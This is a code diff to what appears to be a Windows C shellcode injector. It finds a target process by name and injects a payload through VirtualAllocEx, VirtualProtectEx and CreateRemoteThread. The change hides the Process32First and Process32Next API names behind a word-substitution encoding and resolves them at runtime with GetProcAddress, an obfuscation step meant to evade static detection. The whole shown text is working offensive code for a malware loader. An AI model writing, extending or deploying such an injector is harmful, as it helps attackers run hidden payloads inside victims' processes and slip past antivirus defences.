@@ -26,7 +26,9 @@ const size_t sc_len = sizeof(sc);
 BOOL (WINAPI * pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 LPVOID (WINAPI * pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 HANDLE (WINAPI * pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
+HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD, DWORD);
+BOOL (WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
+BOOL (WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
 HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
 
 // An enum so that the DecodeDict function can know whether to add a null terminator or not
@@ -75,6 +77,10 @@ DWORD FindTarget(const char* processName)
 
 	const char* CreateToolhelp32SnapshotEnc[24] = { "limit", "benefit", "remedies", "logitech", "carol", "remedies", "rolled", "lives", "lives", "delight", "offered", "remedies", "delight", "beliefs", "terry", "dynamic", "helps", "small", "logitech", "beliefs", "often", "offered", "lives", "carol" };
 	unsigned char CreateToolhelp32SnapshotDec[25];
+	const char* Process32FirstEnc[14] = { "wheat", "benefit", "lives", "slide", "remedies", "often", "often", "terry", "dynamic", "oriented", "viewed", "benefit", "often", "carol" };
+	unsigned char Process32FirstDec[15];
+	const char* Process32NextEnc[13] = { "wheat", "benefit", "lives", "slide", "remedies", "often", "often", "terry", "dynamic", "exports", "remedies", "fought", "carol" };
+	unsigned char Process32NextDec[14];
 
 	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
 	if (hKernel32 == NULL)
@@ -83,6 +89,7 @@ DWORD FindTarget(const char* processName)
 		return EXIT_FAILURE;
 	}
 
+
 	if (!DecodeDict(CreateToolhelp32SnapshotEnc, sizeof(CreateToolhelp32SnapshotEnc) / sizeof(CreateToolhelp32SnapshotEnc[0]), CreateToolhelp32SnapshotDec, DECODE_STRING))
 	{
 		printf("%s Failed to decode CreateToolhelp32Snapshot\n", e); 
@@ -90,7 +97,7 @@ DWORD FindTarget(const char* processName)
 	}
 	printf("%s Decoded API: %s\n", k, CreateToolhelp32SnapshotDec);
 
-	pCreateToolhelp32Snapshot = (HANDLE(WINAPI*)(DWORD, DWORD)) GetProcAddress(hKernel32, (LPCSTR)CreateToolhelp32SnapshotDec);
+	pCreateToolhelp32Snapshot = (HANDLE (WINAPI *)(DWORD, DWORD)) GetProcAddress(hKernel32, (LPCSTR)CreateToolhelp32SnapshotDec);
 	if (pCreateToolhelp32Snapshot == 0)
 	{
 		printf("%s Failed to get address of CreateToolhelp32Snapshot, error: %ld\n", e, GetLastError());
@@ -103,8 +110,36 @@ DWORD FindTarget(const char* processName)
 		return 0;
 	}
 
+	if (!DecodeDict(Process32FirstEnc, sizeof(Process32FirstEnc) / sizeof(Process32FirstEnc[0]), Process32FirstDec, DECODE_STRING))
+	{
+		printf("%s Failed to decode Process32First\n", e);
+		return EXIT_FAILURE;
+	}
+	printf("%s Decoded API: %s\n", k, Process32FirstDec);
+
+	if (!DecodeDict(Process32NextEnc, sizeof(Process32NextEnc) / sizeof(Process32NextEnc[0]), Process32NextDec, DECODE_STRING))
+	{
+		printf("%s Failed to decode Process32Next\n", e);
+		return EXIT_FAILURE;
+	}
+	printf("%s Decoded API: %s\n", k, Process32NextDec);
+
 	// Get the first process in the snapshot
-	if (!Process32First(hSnapshot, &pe32))
+	pProcess32First = (BOOL (WINAPI *)(HANDLE, LPPROCESSENTRY32)) GetProcAddress(hKernel32, (LPCSTR)Process32FirstDec);
+	if (pProcess32First == 0)
+	{
+		printf("%s Failed to get address of Process32First, error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
+
+	pProcess32Next = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32)) GetProcAddress(hKernel32, (LPCSTR)Process32NextDec);
+	if (pProcess32Next == 0)
+	{
+		printf("%s Failed to get address of Process32Next, error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
+
+	if (!pProcess32First(hSnapshot, &pe32))
 	{
 		CloseHandle(hSnapshot);
 		return 0;
@@ -286,7 +321,6 @@ int main(int argc, char* argv[])
 		return EXIT_FAILURE;
 	}
 	printf("%s Found target PID: %lu\n", k, PID);
-
 
 	return InjectClassic();
 }
